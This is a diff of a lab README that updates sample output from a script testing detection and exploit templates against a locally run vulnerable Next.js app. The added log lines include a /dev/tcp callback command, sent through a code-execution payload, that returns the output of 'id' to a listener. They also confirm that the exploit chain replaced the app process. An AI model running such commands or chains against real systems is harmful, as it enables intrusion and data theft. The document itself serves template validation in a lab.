@@ -78,17 +78,22 @@ RESULT: lab/app matches the upstream victim app on everything that matters
 templates against the advisory's own code, built here on the same Node 24.20.0 build:
 
 ```bash
-$ ./test-upstream-app.sh
-[upstream] building the upstream app into run/upstream (next build, ~30s)
+$ ./test-upstream-app.sh --repo /path/to/EQSTLab-clone --skip-build
+[upstream] using local repository /path/to/EQSTLab-clone
+[upstream] reusing the existing build in run/upstream (--skip-build)
 [upstream] starting the upstream app on :3002
-  PASS upstream app serves /api/og on :3002
+  PASS upstream app serves /api/og on :3002  ()
+[upstream] OOB listener on :4445
 [upstream] detection template against the upstream app
+    [shim] response NEXTJS_OG_XINCLUDE_REACHABLE http://127.0.0.1:3002 POST /api/og probe=2522895B control=21979B ratio=114.8
   PASS detection matches the upstream app  (probe=2522895B control=21979B ratio=114.8)
 [upstream] exploit template against the upstream app (local callback)
-  PASS exploit matched (shim verdict: matched)
+    payload sent to http://127.0.0.1:3002/api/og: connection closed by target, expected when the chain executes (25286 bytes delivered) cmd=bash -c 'id>/dev/tcp/127.0.0.1/4445'
+  PASS exploit matched (shim verdict: matched)  ()
   PASS callback carried the command output  (uid=1001(user) gid=1001(user) groups=1001(user),27(sudo),100(users))
-  PASS upstream app process was replaced by the chain
-  PASS upstream app serves again on :3002
+  PASS upstream app process was replaced by the chain  ()
+[upstream] restarting the upstream app
+  PASS upstream app serves again on :3002  ()
 [upstream] summary: 6 passed, 0 failed
 ```
 
